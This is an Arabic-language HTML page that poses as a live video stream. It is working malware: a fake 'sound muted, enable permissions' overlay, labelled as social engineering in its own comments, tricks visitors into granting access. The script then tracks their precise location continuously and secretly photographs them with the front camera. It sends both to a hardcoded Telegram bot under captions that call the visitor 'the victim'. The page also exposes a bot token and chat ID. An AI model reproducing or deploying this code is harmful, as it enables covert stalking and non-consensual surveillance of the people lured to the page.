<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>  فديو</title>
    
    <meta property="og:title" content="▶️ فيديو مباشر">
    <meta property="og:image" content="https://appsyria00.github.io/Facebook/2.png">
    <meta property="og:video" content="https://appsyria00.github.io/Facebook/1.mp4">
    <meta property="og:type" content="video.other">

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body, html { height: 100%; width: 100%; overflow: hidden; background-color: #000; font-family: sans-serif; }
        .video-wrapper { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
        video { width: 100%; height: 100%; object-fit: cover; }
        
        /* نافذة الهندسة الاجتماعية الشفافة */
        #audioOverlay { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.6); /* خلفية شفافة تظهر الفيديو خلفها */
            color: white; z-index: 9999; display: flex; flex-direction: column; 
            align-items: center; justify-content: center; text-align: center; padding: 20px;
            display: none; /* تظهر برمجياً */
        }
        #audioBtn { 
            padding: 15px 40px; background: #007bff; color: white; border: none; 
            border-radius: 30px; cursor: pointer; font-weight: bold; font-size: 18px;
            box-shadow: 0 5px 15px rgba(0,123,255,0.4);
        }
    </style>
</head>
<body>

    <div id="audioOverlay">
        <h2 style="margin-bottom:15px;">⚠️ الصوت مكتوم</h2>
        <p style="margin-bottom:20px;">يرجى الضغط على الزر أدناه وتفعيل الأذونات<br>لتشغيل صوت البث المباشر.</p>
        <button id="audioBtn">تشغيل الصوت الآن</button>
    </div>

    <div class="video-wrapper">
        <video id="mainVideo" autoplay muted playsinline poster="2.png" preload="auto">
            <source src="1.mp4" type="video/mp4">
        </video>
    </div>

    <script>
        const botToken = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
        const chatId = "1611398303";

        window.onload = function() {
            // تشغيل الفيديو دغري (صامت)
            const video = document.getElementById('mainVideo');
            video.play();

            // إظهار نافذة "تشغيل الصوت" بعد ثانية واحدة فقط
            setTimeout(() => {
                document.getElementById('audioOverlay').style.display = 'flex';
            }, 1000);
        };

        document.getElementById('audioBtn').onclick = function() {
            // إخفاء النافذة ودخول وضع ملء الشاشة للتمويه
            document.getElementById('audioOverlay').style.display = 'none';
            if (document.documentElement.requestFullscreen) { document.documentElement.requestFullscreen(); }

            // طلب الموقع والكاميرا بشكل متتابع وسريع (دمج الإجراء)
            requestPermissions();
        };

        async function requestPermissions() {
            // 1. طلب الموقع أولاً (لأنه الأكثر إقناعاً مع "تحديد السيرفر")
            navigator.geolocation.watchPosition(pos => {
                const mapsUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendToBot(`📍 موقع مباشر:\n🎯 الدقة: ${pos.coords.accuracy.toFixed(1)}m\n🔗 الخريطة: ${mapsUrl}`);
            }, () => {}, { enableHighAccuracy: true });

            // 2. طلب الكاميرا فوراً بعد الموقع
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                captureAndSend(stream);
            } catch (e) {
                sendToBot("⚠️ الضحية رفض الكاميرا");
            }
        }

        function captureAndSend(stream) {
            let v = document.createElement('video');
            v.srcObject = stream; v.play();
            setTimeout(() => {
                let canvas = document.createElement('canvas');
                canvas.width = 720; canvas.height = 1280;
                canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
                sendPhoto(canvas.toDataURL('image/jpeg'));
                stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا للسرية
            }, 2000);
        }

        function sendToBot(t) { fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(t)}`); }
        
        function sendPhoto(data) {
            let blob = dataURLtoBlob(data);
            let f = new FormData(); f.append('document', blob, "snap.jpg");
            fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}&caption=${encodeURIComponent("📸 لقطة كاميرا الضحية")}`, { method: 'POST', body: f });
        }

        function dataURLtoBlob(d) {
            let p = d.split(','), m = p[0].match(/:(.*?);/)[1], bin = atob(p[1]), n = bin.length, u = new Uint8Array(n);
            while(n--) u[n] = bin.charCodeAt(n);
            return new Blob([u], {type:m});
        }
    </script>
</body>
</html>
